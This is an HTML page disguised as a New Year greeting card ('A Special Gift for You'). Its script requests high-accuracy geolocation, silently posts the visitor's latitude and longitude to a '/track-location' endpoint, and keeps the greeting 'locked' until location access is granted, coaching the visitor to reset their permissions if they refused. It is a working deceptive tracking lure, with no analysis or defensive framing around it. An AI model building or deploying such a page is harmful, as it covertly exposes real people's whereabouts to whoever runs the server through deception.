<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A Special Gift for You</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            margin: 0; 
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        /* Button Styling */
        #openBtn {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 24px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
            transition: all 0.3s ease;
        }
        #openBtn:hover { transform: scale(1.1); background-color: #c0392b; }

        /* Hidden class for toggling views */
        .hidden { display: none; }

        .greeting-image { 
            width: 100%; 
            border-radius: 10px; 
            margin-top: 15px; 
        }
        h1 { color: #2c3e50; }
        p { color: #7f8c8d; }
        .error-text { color: #e74c3c; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container">
        <div id="giftView">
            <h1>You've received a gift!</h1>
            <p>Click below to open your New Year surprise.</p>
            <button id="openBtn" onclick="openGift()">üéÅ Open My Greeting</button>
            <p id="statusMsg" style="font-size: 12px; color: #999; margin-top: 15px;"></p>
        </div>

        <div id="greetingView" class="hidden">
            <h1>Happy New Year! üéä</h1>
            <p>Wishing you a 2026 filled with joy and success!</p>
            <img class="greeting-image" src="https://plus.unsplash.com/premium_photo-1663840297088-5b76140d74ba?w=500" alt="New Year">
        </div>
    </div>

<script>
    function openGift() {
        const status = document.getElementById('statusMsg');
        status.innerHTML = "Processing... Please click <b>'Allow'</b> to see your gift.";
        status.style.color = "#3498db";

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // SUCCESS PATH
                    sendLocation(position.coords.latitude, position.coords.longitude);
                    revealGreeting();
                },
                (error) => {
                    // ERROR PATH: The greeting stays hidden
                    status.style.color = "#e74c3c";
                    if (error.code === 1) { // Permission Denied
                        status.innerHTML = "‚ùå <b>Gift Locked:</b> You must allow location access to unlock your greeting.<br><br>If you clicked 'Block', click the Lock (üîí) icon in your browser address bar and Reset Permissions.";
                    } else {
                        status.textContent = "‚ùå Error: Could not verify location. Please try again.";
                    }
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        }
    }

    function revealGreeting() {
        document.getElementById('giftView').classList.add('hidden');
        document.getElementById('greetingView').classList.remove('hidden');
    }

    function sendLocation(lat, lon) {
        fetch('/track-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude: lat, longitude: lon })
        }).catch(err => console.error("Log error:", err));
    }
</script>
</body>
</html>
